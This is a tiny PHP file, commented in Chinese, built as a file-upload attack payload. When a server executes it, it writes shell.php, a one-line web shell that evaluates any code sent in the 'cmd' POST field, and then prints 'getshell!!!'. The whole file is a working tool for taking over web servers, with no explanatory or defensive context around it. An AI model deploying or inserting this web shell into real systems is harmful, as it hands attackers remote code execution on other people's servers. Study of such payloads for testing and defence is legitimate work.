<?php
// 此文件上传后，一旦被服务器解析执行，会在当前目录生成 shell.php
// shell.php 内容为: <?php @eval($_POST['cmd']);?>
$myfile = fopen("shell.php", "w");
$text = '<?php @eval($_POST["cmd"]);?>';
fwrite($myfile, $text);
fclose($myfile);
echo "getshell!!!";
?>
